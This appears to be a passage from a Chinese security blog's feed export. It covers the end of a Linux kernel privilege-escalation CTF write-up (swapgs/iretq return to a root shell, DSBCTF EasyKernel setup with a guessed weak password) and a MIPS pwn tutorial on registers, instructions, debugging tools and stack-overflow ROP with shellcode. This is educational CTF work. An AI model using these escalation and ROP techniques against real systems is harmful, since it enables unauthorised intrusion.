                      class=""
                >

<p>而<strong>popfq</strong>会把栈上弹出一个内容复制给e&#x2F;rflags寄存器，先后对比如下。但这个并不重要，因为后面的ireq还会恢复e&#x2F;rflags寄存器，所以这里的<strong>popfq</strong>只是gadget中<strong>swapgs</strong>的副作用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004009402.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004050999.png"
                      class=""
                >

<p>而<strong>iretq</strong>则相当于先返回到当前栈顶地址处（用户态空间），然后依次从栈上弹出4个内容赋给cs，e&#x2F;rflags，sp，以及ss。我们在函数一开始调用<strong>save_status</strong>就是为了这时候还原。</p>
<p>然后我们就返回了root权限的shell，要测试提权是否成功，我们现在回到init中把<code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>中的0改回1000，然后重新打包并启动，运行exp看看效果。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118005531726.png"
                      class=""
                >

<p>成功提权。</p>
<h5 id="DSBCTF-EasyKernel"><a href="#DSBCTF-EasyKernel" class="headerlink" title="DSBCTF-EasyKernel"></a>DSBCTF-EasyKernel</h5><p>给了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119171402051.png"
                      class=""
                >

<p>先解压文件系统。然后在run.sh中加入<code>-s</code>启用gdb调试。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>

<p>这里我们缺vmlinux，可以用源码中的extract-vmlinux脚本来从bzImage中提取vmlinux。然后再用vmlinux-to-elf 工具恢复符号表。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/e/ctf/kernel/linux-5.15.153/scripts/extract-vmlinux ./bzImage&gt; vmlinux</span><br><span class="line">vmlinux-to-elf ./vmlinux ./vmlinux_</span><br></pre></td></tr></table></figure></div>

<p>尝试启动时发现不是进入shell环境，而是要求进行登录。实际上，我们通过查看解压出的文件系统，可以发现&#x2F;etc&#x2F;inittab这个文件。这说明系统使用getty进行登录。我们通过查看etc&#x2F;passwd文件的内容，很容易就能得到用户名为ctfshow，而密码加密后存在etc&#x2F;shadow里，这个我们一般猜不到，这里我们尝试弱口令爆破，得到密码就为<strong>ctfshow</strong>，之后就能进入shell环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119180323832.png"
                      class=""
                >

<p>因为这题采用的是登录式，我们如果想要以root权限登录方便调试，就要先改&#x2F;etc&#x2F;shadow文件的root密码。这里我们直接清空这个root用户的密码。即改成<code>root::::::::</code>。之后我们用ctfshow用户登录进去后，就可以自由切换到root用户。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250120000054782.png"
                      class=""
                >

<p>对于run.sh以及init文件的分析在上文已经作为例子提及了，这里直接看提供的模块<strong>ctfshow.ko</strong>。</p>
<p>首先看<strong>init_module</strong>，注册了kqueue这个设备，之后可以靠kqueue_ioctl来进行交互。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119172615036.png"
                      class=""
                >



<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a class="link"   href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/" >https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://sky123.blog.csdn.net/article/details/130815994?sharetype=blogdetail&amp;sharerId=130815994&amp;sharerefer=WAP&amp;sharesource=" >https://sky123.blog.csdn.net/article/details/130815994?sharetype=blogdetail&amp;sharerId=130815994&amp;sharerefer=WAP&amp;sharesource=<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_45323960/article/details/130815994" >https://blog.csdn.net/qq_45323960/article/details/130815994<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>mips_pwn</title>
    <url>/blog/2024/09/21/mips-pwn/</url>
    <content><![CDATA[<h4 id="一、mips架构概述"><a href="#一、mips架构概述" class="headerlink" title="一、mips架构概述"></a>一、mips架构概述</h4><h5 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h5><table>
<thead>
<tr>
<th align="left">寄存器</th>
<th>别名</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td>$zero</td>
<td>常量0</td>
</tr>
<tr>
<td align="left">$1</td>
<td>$at</td>
<td>保留给汇编器（Assembler Temporary）。在汇编过程中用于一些临时计算，程序员不应直接使用。</td>
</tr>
<tr>
<td align="left">$2-$3</td>
<td>$v0-$v1</td>
<td>用于存储函数的返回值。</td>
</tr>
<tr>
<td align="left">$4-$7</td>
<td>$a0-$a3</td>
<td>函数调用参数，用于传递最多 4 个函数参数。</td>
</tr>
<tr>
<td align="left">$8-$15</td>
<td>$t0-$t7</td>
<td>临时寄存器。用于函数内部的临时计算，不需要保存其值。</td>
</tr>
<tr>
<td align="left">$16-$23</td>
<td>$s0-$s7</td>
<td>保存寄存器。用于保存函数调用期间的值，调用函数时需要保留的值。</td>
</tr>
<tr>
<td align="left">$24-$25</td>
<td>$t8-$t9</td>
<td>临时寄存器。与 <code>$t0-$t7</code> 类似，但通常不需要在函数调用中保存其值。</td>
</tr>
<tr>
<td align="left">$26-$27</td>
<td>$k0-$k1</td>
<td>保留给操作系统内核。通常用于内核中进行系统调用或中断处理。</td>
</tr>
<tr>
<td align="left">$28</td>
<td>$gp</td>
<td>全局指针。指向全局数据区域的基地址，便于访问全局变量。</td>
</tr>
<tr>
<td align="left">$29</td>
<td>$sp</td>
<td>堆栈指针。指向当前堆栈的顶部，用于管理函数调用和局部变量。</td>
</tr>
<tr>
<td align="left">$30</td>
<td>$fp($s8)</td>
<td>帧指针。指向当前栈帧的基地址，通常用于访问局部变量和参数。</td>
</tr>
<tr>
<td align="left">$31</td>
<td>$ra</td>
<td>返回地址。用于存储函数调用的返回地址，在函数调用时保存，并在函数返回时使用。</td>
</tr>
<tr>
<td align="left">PC</td>
<td>PC</td>
<td>保存当前正在执行的指令的地址，并在每次指令执行后自动递增，以指向下一条指令的地址。</td>
</tr>
</tbody></table>
<p>mips架构中的fp寄存器相当于rbp，pc寄存器相当于rip。</p>
<h5 id="2-特征"><a href="#2-特征" class="headerlink" title="2.特征"></a>2.特征</h5><ul>
<li><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p>
</li>
<li><p><strong>MIPS 处理器通常将指令缓存（I-cache）和数据缓存（D-cache）分开，这有助于提高访问效率和减少缓存冲突。</strong></p>
</li>
<li><p>所有 MIPS 指令都具有固定的 32 位长度，这使得指令解码更加简单和高效。</p>
</li>
<li><p>MIPS 默认使用大端字节序，即最显著字节存储在最低地址。虽然 MIPS 也支持小端字节序，但大端字节序是 MIPS 的传统配置。</p>
</li>
<li><p>三种主要指令格式：</p>
<ul>
<li><strong>R 型</strong>：用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</li>
<li><strong>I 型</strong>：用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</li>
<li><strong>J 型</strong>：用于跳转，例如 <code>j</code>、<code>jal</code>。</li>
</ul>
</li>
<li><p>流水线操作</p>
<p>MIPS架构采用了流水线技术来提高指令执行的效率。流水线允许处理器同时处理多条指令的不同部分，从而大幅提高吞吐量。</p>
<p>常见的MIPS芯片流水线操作分为五个阶段：</p>
<ul>
<li><strong>IF（Instruction Fetch，指令提取）</strong>：从内存中提取指令。</li>
<li><strong>ID（Instruction Decode，指令解码）</strong>：对提取的指令进行解码，确定需要执行的操作。</li>
<li><strong>EX（Execute，执行）</strong>：执行指令，包括算术运算、逻辑运算等。</li>
<li><strong>MEM（Memory Access，存储器访问）</strong>：访问内存，读取或写入数据。</li>
<li><strong>WB（Write Back，寄存器写回）</strong>：将执行结果写回寄存器。</li>
</ul>
<p>在理想情况下，流水线中的每个阶段都会同时进行，使得处理器可以每个时钟周期执行一条新指令。然而，由于某些指令的执行需要更多的时间，可能会导致流水线暂停（称为“流水线停顿”），从而影响性能。</p>
<p><strong>分支延迟槽</strong></p>
<p>MIPS架构有一个特殊的概念叫<strong>分支延迟槽</strong>。当程序遇到分支指令（如跳转指令）时，程序会跳转到新的地址去执行新指令。然而，由于流水线的设计，紧接在分支指令之后的指令已经在流水线中开始执行了。为了避免浪费，MIPS架构规定，<strong>分支后的第一条指令（即位于分支延迟槽中的指令）会在跳转之前执行</strong>。</p>
<p>这意味着，在编写MIPS汇编代码或分析MIPS的二进制文件时，需要特别注意分支延迟槽的存在。例如，在以下MIPS汇编代码中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0007F944    move    $t9, $s0</span><br><span class="line">.text:0007F948    jalr    $t9              </span><br><span class="line">.text:0007F94C    move    $a0, $s1</span><br></pre></td></tr></table></figure></div>

<p>虽然<code>jalr</code>指令是一个跳转指令，但紧接在其后的<code>move $a0, $s1</code>指令会在跳转之前执行。</p>
<p>一般而言跳转指令的下一条指令会是nop，但这种行为在查找利用漏洞的gadgets以及构造payload时非常重要。</p>
</li>
</ul>
<h5 id="3-指令格式"><a href="#3-指令格式" class="headerlink" title="3.指令格式"></a>3.指令格式</h5><blockquote>
<p>op:指令基本操作，称为操作码。<br>rs:第一个源操作数寄存器。<br>rt:第二个源操作数寄存器。<br>rd:存放操作结果的目的操作数。<br>shamt:位移量；<br>funct:函数，这个字段选择op操作的某个特定变体。  </p>
</blockquote>
<p>32位长度分配如下</p>
<p><strong>R格式</strong>   </p>
<table>
<thead>
<tr>
<th>6</th>
<th>5</th>
<th>5</th>
<th>5</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>op</td>
<td>rs</td>
<td>rt</td>
<td>rd</td>
<td>shamt</td>
<td>funct</td>
</tr>
</tbody></table>
<p> 用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</p>
<p><strong>I格式</strong>      </p>
<table>
<thead>
<tr>
<th>6</th>
<th>5</th>
<th>5</th>
<th>16</th>
</tr>
</thead>
<tbody><tr>
<td>op</td>
<td>rs</td>
<td>rt</td>
<td>立即数操作</td>
</tr>
</tbody></table>
<p>用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</p>
<p><strong>J格式</strong>   </p>
<table>
<thead>
<tr>
<th>6</th>
<th>26</th>
</tr>
</thead>
<tbody><tr>
<td>op</td>
<td>跳转地址</td>
</tr>
</tbody></table>
<p>用于跳转，例如 <code>j</code>、<code>jal</code>。</p>
<h5 id="4-常用指令"><a href="#4-常用指令" class="headerlink" title="4.常用指令"></a>4.常用指令</h5><table>
<thead>
<tr>
<th><strong>指令</strong></th>
<th><strong>功能</strong></th>
<th><strong>语法</strong></th>
<th><strong>示例</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>add</code></strong></td>
<td>加法（有符号）</td>
<td><code>add $rd, $rs, $rt</code></td>
<td><code>add $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>addu</code></strong></td>
<td>加法（无符号）</td>
<td><code>addu $rd, $rs, $rt</code></td>
<td><code>addu $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加（无符号），结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sub</code></strong></td>
<td>减法（有符号）</td>
<td><code>sub $rd, $rs, $rt</code></td>
<td><code>sub $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>subu</code></strong></td>
<td>减法（无符号）</td>
<td><code>subu $rd, $rs, $rt</code></td>
<td><code>subu $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值（无符号），结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>and</code></strong></td>
<td>按位与</td>
<td><code>and $rd, $rs, $rt</code></td>
<td><code>and $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>or</code></strong></td>
<td>按位或</td>
<td><code>or $rd, $rs, $rt</code></td>
<td><code>or $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位或，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>xor</code></strong></td>
<td>按位异或</td>
<td><code>xor $rd, $rs, $rt</code></td>
<td><code>xor $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位异或，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>nor</code></strong></td>
<td>按位与非</td>
<td><code>nor $rd, $rs, $rt</code></td>
<td><code>nor $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与非，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sll</code></strong></td>
<td>左移</td>
<td><code>sll $rd, $rt, shamt</code></td>
<td><code>sll $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值左移 2 位，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>srl</code></strong></td>
<td>逻辑右移</td>
<td><code>srl $rd, $rt, shamt</code></td>
<td><code>srl $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值右移 2 位，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sra</code></strong></td>
<td>算术右移</td>
<td><code>sra $rd, $rt, shamt</code></td>
<td><code>sra $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值算术右移 2 位，结果存储在 <code>$t0</code> 中</td>
</tr>
<tr>
<td><strong><code>lw</code></strong></td>
<td>加载字（32 位）</td>
<td><code>lw $rt, offset($rs)</code></td>
<td><code>lw $t0, 4($a0)</code></td>
<td>从地址 <code>$a0 + 4</code> 处加载 4 字节数据到 <code>$t0</code>。</td>
</tr>
<tr>
<td><strong><code>sw</code></strong></td>
<td>存储字（32 位）</td>
<td><code>sw $rt, offset($rs)</code></td>
<td><code>sw $t0, 4($a0)</code></td>
<td>将 <code>$t0</code> 中的数据存储到地址 <code>$a0 + 4</code> 处。</td>
</tr>
<tr>
<td><strong><code>lb</code></strong></td>
<td>加载字节（8 位）</td>
<td><code>lb $rt, offset($rs)</code></td>
<td><code>lb $t0, 0($a0)</code></td>
<td>从地址 <code>$a0</code> 处加载 1 字节数据到 <code>$t0</code>。</td>
</tr>
<tr>
<td><strong><code>sb</code></strong></td>
<td>存储字节（8 位）</td>
<td><code>sb $rt, offset($rs)</code></td>
<td><code>sb $t0, 0($a0)</code></td>
<td>将 <code>$t0</code> 中的 1 字节数据存储到地址 <code>$a0</code> 处。</td>
</tr>
<tr>
<td><strong><code>lui</code></strong></td>
<td>加载上半字（立即数）</td>
<td><code>lui $rt, imm</code></td>
<td><code>lui $t0, 0x1234</code></td>
<td>将立即数 <code>0x1234</code> 加载到 <code>$t0</code> 的高 16 位（低 16 位为 0）。</td>
</tr>
<tr>
<td><strong><code>ori</code></strong></td>
<td>立即数按位或</td>
<td><code>ori $rt, $rs, imm</code></td>
<td><code>ori $t0, $t1, 0xFF</code></td>
<td>将 <code>$t1</code> 和立即数 <code>0xFF</code> 按位或，结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>beq</code></strong></td>
<td>等于分支</td>
<td><code>beq $rs, $rt, offset</code></td>
<td><code>beq $t0, $t1, label</code></td>
<td>如果 <code>$t0</code> 等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
</tr>
<tr>
<td><strong><code>bne</code></strong></td>
<td>不等于分支</td>
<td><code>bne $rs, $rt, offset</code></td>
<td><code>bne $t0, $t1, label</code></td>
<td>如果 <code>$t0</code> 不等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
</tr>
<tr>
<td><strong><code>j</code></strong></td>
<td>无条件跳转</td>
<td><code>j target</code></td>
<td><code>j label</code></td>
<td>跳转到 <code>label</code> 处。</td>
</tr>
<tr>
<td><strong><code>jal</code></strong></td>
<td>跳转并链接</td>
<td><code>jal target</code></td>
<td><code>jal subroutine</code></td>
<td>跳转到 <code>subroutine</code>，并将返回地址存储在 <code>$ra</code> 寄存器中。</td>
</tr>
<tr>
<td><strong><code>jr</code></strong></td>
<td>跳转寄存器</td>
<td><code>jr $rs</code></td>
<td><code>jr $ra</code></td>
<td>跳转到 <code>$ra</code> 寄存器中存储的地址。</td>
</tr>
<tr>
<td><strong><code>nop</code></strong></td>
<td>空操作</td>
<td><code>nop</code></td>
<td><code>nop</code></td>
<td>什么也不做，通常用于填充延迟槽。</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">or         s8,sp,zero		#实现了x86架构中的mov功能，相当于mov s8,sp</span><br></pre></td></tr></table></figure></div>



<h5 id="5-MIPS栈帧结构"><a href="#5-MIPS栈帧结构" class="headerlink" title="5.MIPS栈帧结构"></a>5.MIPS栈帧结构</h5><p>典型的MIPS栈帧结构包括以下部分：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------------------+ &lt;-- 栈顶（高地址）</span><br><span class="line">|  返回地址（$ra）          | 保存调用者的返回地址</span><br><span class="line">+-------------------------+</span><br><span class="line">|  上一个栈帧的栈指针        | 保存调用者的栈底指针（$fp）</span><br><span class="line">+-------------------------+</span><br><span class="line">|  函数参数（如果需要）      | 超过寄存器数量的函数参数存放在栈中</span><br><span class="line">+-------------------------+</span><br><span class="line">|  局部变量                | 局部变量、临时数据等</span><br><span class="line">+-------------------------+</span><br><span class="line">|  ...                    | 其他数据</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">|  栈空闲区                |</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+ &lt;-- 栈底（低地址）</span><br></pre></td></tr></table></figure></div>

<p>MIPS架构中的栈通常是<strong>向下增长</strong>的，这意味着随着栈的推进，栈顶指针（<code>$sp</code>）的值会递减。其中局部变量的寻址是通过$sp或$fp进行的。</p>
<p>mips函数调用基本格式，其中分为叶子函数和非叶子函数，一般pwn题中做的都是非叶子函数，因为main函数之前程序还会执行其他初始化函数。</p>
<p><strong>叶子函数</strong>和<strong>非叶子函数</strong>的主要区别在于它们是否调用其他函数：</p>
<ul>
<li><strong>叶子函数</strong>：<ul>
<li><strong>定义</strong>：叶子函数是指在其内部不调用任何其他函数的函数。</li>
<li>特点<ul>
<li>由于不调用其他函数，因此不需要保存和恢复返回地址（即<code>$ra</code>寄存器的值）。</li>
<li>叶子函数通常不需要额外的栈操作，因为它不需要保存其他函数的返回地址或其他寄存器的值。</li>
<li>返回时直接使用<code>jr $ra</code>指令跳转回调用者。</li>
</ul>
</li>
</ul>
</li>
<li><strong>非叶子函数</strong>：<ul>
<li><strong>定义</strong>：非叶子函数是指在其内部会调用其他函数的函数。</li>
<li>特点<ul>
<li>由于可能调用其他函数，需要保存当前函数的返回地址（存储在<code>$ra</code>寄存器中）到栈中，以防止被覆盖。</li>
<li>非叶子函数通常需要调整栈指针（<code>$sp</code>）并保存调用者的返回地址、寄存器状态等信息。</li>
<li>在返回时，需要从栈中恢复保存的返回地址和寄存器状态，然后使用<code>jr $ra</code>指令返回到调用者。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>简而言之，叶子函数不会调用其他函数，因此对栈的操作较少；而非叶子函数会调用其他函数，因此需要处理更多的栈操作来保存和恢复状态。</p>
<p>非叶子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Prologue</span><br><span class="line">addiu      sp,sp,-0x60				#栈上开辟空间</span><br><span class="line">sw         ra,local_4 (sp)			#存返回地址</span><br><span class="line">sw         s8,local_8 (sp)			#存该函数的栈底</span><br><span class="line">or         s8,sp,zero</span><br><span class="line">lui        gp,0x4a</span><br><span class="line">addiu      gp,gp,-0x5d50			#设置全局变量的指针</span><br><span class="line">sw         gp=&gt;_gp ,local_50 (sp)</span><br><span class="line">...</span><br><span class="line">#Epilogue</span><br><span class="line">lw         gp,local_50 (s8)</span><br><span class="line">or         v0,zero ,zero</span><br><span class="line">or         sp,s8,zero</span><br><span class="line">lw         ra,local_4 (sp)</span><br><span class="line">lw         s8,local_8 (sp)</span><br><span class="line">addiu      sp,sp,0x60</span><br><span class="line">jr         ra</span><br><span class="line">...</span><br><span class="line">#args offered</span><br><span class="line">li         a2,0x100						#size</span><br><span class="line">addiu      v0,s8,0x18</span><br><span class="line">or         a1,v0,zero					#buf</span><br><span class="line">or         a0,zero ,zero				#fd</span><br><span class="line">lw         v0,-0x7f90 (gp)		=&gt;-&gt;read                     </span><br><span class="line">or         t9,v0,zero</span><br><span class="line">bal        read                           </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>叶子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 执行函数B的任务</span><br><span class="line"># 不调用其他函数</span><br><span class="line"># 直接返回</span><br><span class="line">jr $ra</span><br></pre></td></tr></table></figure></div>



<h4 id="二、mips环境搭建"><a href="#二、mips环境搭建" class="headerlink" title="二、mips环境搭建"></a>二、mips环境搭建</h4><h5 id="1-安装qemu"><a href="#1-安装qemu" class="headerlink" title="1.安装qemu"></a>1.安装qemu</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu</span><br><span class="line"><span class="comment">#check if qemu existed</span></span><br><span class="line">qemu --version</span><br></pre></td></tr></table></figure></div>



<h5 id="2-安装gdb-multiarch"><a href="#2-安装gdb-multiarch" class="headerlink" title="2.安装gdb-multiarch"></a>2.安装gdb-multiarch</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br><span class="line"><span class="comment">#check if gdb-multiarch downloaded successfully</span></span><br><span class="line">gdb-multiarch --version</span><br></pre></td></tr></table></figure></div>



<h5 id="3-安装ghidra"><a href="#3-安装ghidra" class="headerlink" title="3.安装ghidra"></a>3.安装ghidra</h5><p>用于反编译mips指令，吾爱提供的有些IDA只包含x86和x64的Hex-Rays Decompiler插件</p>
<p>ghidra下载地址：<a class="link"   href="https://github.com/NationalSecurityAgency/ghidra/releases" >https://github.com/NationalSecurityAgency/ghidra/releases<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>运行ghidra还需要JDK17及以上的环境</p>
<p>jdk下载地址：<a class="link"   href="https://adoptium.net/zh-CN/" >https://adoptium.net/zh-CN/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><strong>启动 Ghidra</strong>：</p>
<ul>
<li><p>Windows</p>
<ul>
<li>进入 Ghidra 的安装目录，双击 <code>ghidraRun.bat</code> 文件启动 Ghidra。</li>
</ul>
</li>
<li><p>Linux&#x2F;macOS</p>
<ul>
<li><p>打开终端，导航到 Ghidra 的安装目录，然后运行以下命令启动 Ghidra：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<p><strong>初次运行设置</strong>：</p>
<ul>
<li>Ghidra 启动后会提示你设置用户目录，你可以选择默认路径或自定义路径。</li>
<li>阅读并接受用户协议后，Ghidra 会启动并显示主界面。</li>
</ul>
<h5 id="4-安装IDA插件mipsrop"><a href="#4-安装IDA插件mipsrop" class="headerlink" title="4.安装IDA插件mipsrop"></a>4.安装IDA插件mipsrop</h5><p>这里我用的是吾爱的IDA_Pro_v8.3_Portable，其他版本情况可能会有不同。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/ida.git ida-plugins</span><br></pre></td></tr></table></figure></div>

<p>mipsrop.py在 ida-plugins&#x2F;plugins&#x2F;mipsrop目录下，将其复制进IDA的plugins目录即可</p>
<p><strong>可能遇到的问题</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180630264.png"
                      class=""
                >

<p>在ida-plugins&#x2F;plugins目录下还有个shims文件夹，将其也复制到IDA的plugins目录就行。</p>
<h5 id="5-调试方法"><a href="#5-调试方法" class="headerlink" title="5.调试方法"></a>5.调试方法</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -g 6666 -L ./ ./program		<span class="comment">#开的端口是6666</span></span><br></pre></td></tr></table></figure></div>

<p>之后用gdb连接</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch program</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:6666</span><br></pre></td></tr></table></figure></div>

<p>在python写pwn利用脚本过程中，可以在在process中指定打开的端口，然后附加到gdb时就可以连接。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">programe = <span class="string">&#x27;your_program&#x27;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="三、mips的一些栈上漏洞利用"><a href="#三、mips的一些栈上漏洞利用" class="headerlink" title="三、mips的一些栈上漏洞利用"></a>三、mips的一些栈上漏洞利用</h4><p>这里以32位的mips（o32 ABI）为例，其余原理相同。</p>
<h5 id="1-栈溢出-syscall"><a href="#1-栈溢出-syscall" class="headerlink" title="1.栈溢出+syscall"></a>1.栈溢出+syscall</h5><p>如果一个函数是非叶子函数，则其返回地址也会出现在栈上，最后会读取该地址并返回，类似于x86架构，那我们就可以覆盖返回地址实现ROP，mips架构中比较麻烦的是寻找gadget，这里我们用的是IDA的mipsrop插件。</p>
<p>由于mips架构是没有NX保护的，其实我们可以把shellcode写到栈上后想办法跳转到shellcode处执行。</p>
<p>我们可以先用<code>mipsrop.stackfinders()</code>这个方法来获取能把栈相关地址写到某个寄存器的gadget，然后定位到control jump中为jalr $fp的那个，因为$fp也是一个栈相关的地址，正好位于返回地址向低地址偏移4字节处，如果能栈溢出的话也能进行控制$fp位置的内容。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180732229.png"
                      class=""
                >

<p>然后既然能控制$a2寄存器的值为一个栈上的可控地址，那么只要我们再找到一个能跳转到$a2的gadget，将其写入$fp的位置处，就能实现ret2syscall。<code>move $t9,reg</code>后面一般都会找到对应的跳转语句。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180805478.png"
                      class=""
                >

